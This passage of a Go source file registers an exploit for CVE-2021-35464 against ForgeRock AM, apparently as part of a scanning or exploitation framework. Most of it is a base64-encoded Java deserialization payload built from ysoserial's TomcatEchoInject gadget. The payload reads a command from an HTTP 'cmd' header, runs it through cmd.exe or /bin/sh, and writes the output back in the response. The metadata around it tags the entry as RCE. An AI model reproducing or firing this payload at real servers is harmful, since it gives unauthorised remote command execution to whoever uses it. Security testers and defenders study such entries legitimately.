0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAA2NscwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAEdmFyNQEAIUxqYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uOwEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAGcmVzdWx0AQACW0IBAAlwcm9jZXNzb3IBABJMamF2YS9sYW5nL09iamVjdDsBAANyZXEBAARyZXNwAQABagEAAUkBAAF0AQASTGphdmEvbGFuZy9UaHJlYWQ7AQADc3RyAQASTGphdmEvbGFuZy9TdHJpbmc7AQADb2JqAQAKcHJvY2Vzc29ycwEAEExqYXZhL3V0aWwvTGlzdDsBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFpAQAEZmxhZwEAAVoBAAVncm91cAEAF0xqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQABZgEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAd0aHJlYWRzAQATW0xqYXZhL2xhbmcvVGhyZWFkOwEADVN0YWNrTWFwVGFibGUHANAHANEHANIHAKcHAKMHAJoHAJ0HAGMHAMgHAMsBAApTb3VyY2VGaWxlAQAVVG9tY2F0RWNob0luamVjdC5qYXZhDABHAEgHANIMANMA1AwA1QDWDADXANgMANkA2gcA0QwA2wDcDADdAN4MAN8A4AEABGV4ZWMMAOEA4gEABGh0dHABAAZ0YXJnZXQBABJqYXZhL2xhbmcvUnVubmFibGUBAAZ0aGlzJDABAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MAOMA2AEABmdsb2JhbAEADmphdmEvdXRpbC9MaXN0DADkAOUMAN0A5gEAC2dldFJlc3BvbnNlAQAPamF2YS9sYW5nL0NsYXNzDADnAOgBABBqYXZhL2xhbmcvT2JqZWN0BwDpDADqAOsBAAlnZXRIZWFkZXIBABBqYXZhL2xhbmcvU3RyaW5nAQADY21kDADsAO0BAAlzZXRTdGF0dXMMAO4AXwEAEWphdmEvbGFuZy9JbnRlZ2VyDABHAO8BAAdvcy5uYW1lBwDwDADxAPIMAPMA4AEABndpbmRvdwEAB2NtZC5leGUBAAIvYwEABy9iaW4vc2gBAAItYwEAEWphdmEvdXRpbC9TY2FubmVyAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyDABHAPQMAPUA9gcA9wwA-AD5DABHAPoBAAJcQQwA-wD8DAD9AOAMAP4A_wEAJG9yZy5hcGFjaGUudG9tY2F0LnV0aWwuYnVmLkJ5dGVDaHVuawwBAAEBDAECAQMBAAhzZXRCeXRlcwwBBADoAQAHZG9Xcml0ZQEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24BABNqYXZhLm5pby5CeXRlQnVmZmVyAQAEd3JhcAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAQUASAEAI3lzb3NlcmlhbC9wYXlsb2Fkcy9Ub21jYXRFY2hvSW5qZWN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAFWphdmEvbGFuZy9UaHJlYWRHcm91cAEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAA1nZXRTdXBlcmNsYXNzAQAEc2l6ZQEAAygpSQEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAdpc0VtcHR5AQADKClaAQAEVFlQRQEABChJKVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEACGdldEJ5dGVzAQAEKClbQgEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldERlY2xhcmVkTWV0aG9kAQAPcHJpbnRTdGFja1RyYWNlACEARQBGAAAAAAAEAAEARwBIAAEASQAAAC8AAQABAAAABSq3AAGxAAAAAgBKAAAABgABAAAAEQBLAAAADAABAAAABQBMAE0AAAABAE4ATwACAEkAAAA_AAAAAwAAAAGxAAAAAgBKAAAABgABAAAAYABLAAAAIAADAAAAAQBMAE0AAAAAAAEAUABRAAEAAAABAFIAUwACAFQAAAAEAAEAVQABAE4AVgACAEkAAABJAAAABAAAAAGxAAAAAgBKAAAABgABAAAAZgBLAAAAKgAEAAAAAQBMAE0AAAAAAAEAUABRAAEAAAABAFcAWAACAAAAAQBZAFoAAwBUAAAABAABAFUACABbAEgAAQBJAAAF7QAIABEAAAMDAzu4AAK2AANMAU0rtgAEEgW2AAZNLAS2AAcsK7YACMAACcAACU4DNgQVBC2-ogLNLRUEMjoFGQXHAAanArkZBbYACjoGGQYSC7YADJoADRkGEg22AAyaAAanApsZBbYABBIOtgAGTSwEtgAHLBkFtgAIOgcZB8EAD5oABqcCeBkHtgAEEhC2AAZNLAS2AAcsGQe2AAg6BxkHtgAEEhG2AAZNpwAWOggZB7YABLYAE7YAExIRtgAGTSwEtgAHLBkHtgAIOgcZB7YABLYAExIUtgAGTacAEDoIGQe2AAQSFLYABk0sBLYABywZB7YACDoHGQe2AAQSFbYABk0sBLYABywZB7YACMAAFsAAFjoIAzYJFQkZCLkAFwEAogHLGQgVCbkAGAIAOgoZCrYABBIZtgAGTSwEtgAHLBkKtgAIOgsZC7YABBIaA70AG7YAHBkLA70AHbYAHjoMGQu2AAQSHwS9ABtZAxIgU7YAHBkLBL0AHVkDEiFTtgAewAAgOgYZBsYBVxkGtgAimgFPGQy2AAQSIwS9ABtZA7IAJFO2ABwZDAS9AB1ZA7sAJVkRAMi3ACZTtgAeVxInuAAotgApEiq2AAyZABkGvQAgWQMSK1NZBBIsU1kFGQZTpwAWBr0AIFkDEi1TWQQSLlNZBRkGUzoNuwAvWbsAMFkZDbcAMbYAMrYAM7cANBI1tgA2tgA3tgA4Og4SObgAOjoPGQ-2ADs6BxkPEjwGvQAbWQMSPVNZBLIAJFNZBbIAJFO2AD4ZBwa9AB1ZAxkOU1kEuwAlWQO3ACZTWQW7ACVZGQ6-twAmU7YAHlcZDLYABBI_BL0AG1kDGQ9TtgAcGQwEvQAdWQMZB1O2AB5XpwBOOg8SQbgAOjoQGRASQgS9ABtZAxI9U7YAPhkQBL0AHVkDGQ5TtgAeOgcZDLYABBI_BL0AG1kDGRBTtgAcGQwEvQAdWQMZB1O2AB5XBDsamQAGpwAJhAkBp_4vGpkABqcAEacACDoFpwADhAQBp_0ypwAISyq2AESxAAgAlwCiAKUAEgDFANMA1gASAhUCiAKLAEAAMAA7Au8AQwA-AFkC7wBDAFwAfALvAEMAfwLpAu8AQwAAAvoC_QBDAAMASgAAAQYAQQAAABUAAgAWAAkAFwALABgAFQAaABoAGwAmABwAMAAeADYAHwA-ACAARQAhAFwAIgBnACMAbAAkAHQAJQB_ACYAigAnAI8AKACXACoAogAtAKUAKwCnACwAuAAuAL0ALwDFADEA0wA0ANYAMgDYADMA4wA1AOgANgDwADcA-wA4AQAAOQEOADoBHQA7ASgAPAEzAD0BOAA-AUAAPwFZAEABfwBBAYwAQgG3AEMB8gBEAhUARgIcAEcCIwBIAmYASQKIAE4CiwBKAo0ASwKUAEwCtABNAtYATwLYAFEC3wA6AuUAUwLsAFYC7wBUAvEAVQL0ABwC-gBaAv0AWAL-AFkDAgBbAEsAAADeABYApwARAFwAXQAIANgACwBcAF0ACAIcAGwAXgBfAA8ClABCAF4AXwAQAo0ASQBgAGEADwHyAOYAYgBjAA0CFQDDAGQAZQAOASgBtwBmAGcACgFAAZ8AaABnAAsBWQGGAGkAZwAMAREB1ABqAGsACQA2ArYAbABtAAUARQKnAG4AbwAGAHQCeABwAGcABwEOAd4AcQByAAgC8QADAFwAcwAFACkC0QB0AGsABAACAvgAdQB2AAAACQLxAHcAeAABAAsC7wB5AHoAAgAmAtQAewB8AAMC_gAEAFwAcwAAAH0AAACoABf_ACkABQEHAH4HAH8HAAkBAAD8ABQHAID8ABoHAIEC_AAiBwCCZQcAgxJdBwCDDP0ALQcAhAH-AMsHAIIHAIIHAIJSBwCF_wCaAA8BBwB-BwB_BwAJAQcAgAcAgQcAggcAhAEHAIIHAIIHAIIHAIUHAD0AAQcAhvsASvkAAfgABvoABf8ABgAFAQcAfgcAfwcACQEAAEIHAIcE_wAFAAAAAEIHAIcEAAEAiAAAAAIAiXVxAH4AJAAAAdjK_rq-AAAANAAbCgADABUHABcHABgHABkBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAA0ZvbwEADElubmVyQ2xhc3NlcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHABoBACN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbwEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAEAAQAKAAsAAQAMAAAAMwABAAEAAAAFKrcAAbEAAAACAA0AAAAKAAIAAACUAAQAlQAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHNyABRqYXZhLm1hdGguQmlnSW50ZWdlcoz8nx-pO_sdAwAGSQAIYml0Q291bnRJAAliaXRMZW5ndGhJABNmaXJzdE5vbnplcm9CeXRlTnVtSQAMbG93ZXN0U2V0Qml0SQAGc2lnbnVtWwAJbWFnbml0dWRldAACW0J4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHD_______________7____-AAAAAXVxAH4AJAAAAAEBeHg$"
      },
      "SetVariable": [
        "output|lastbody"
      ]
    }
  ],
  "Tags": [
    "RCE"
  ],
  "CVEIDs": [
    "CVE-2021-35464"
  ],
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": [
      "ForgeRock AM"
    ],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}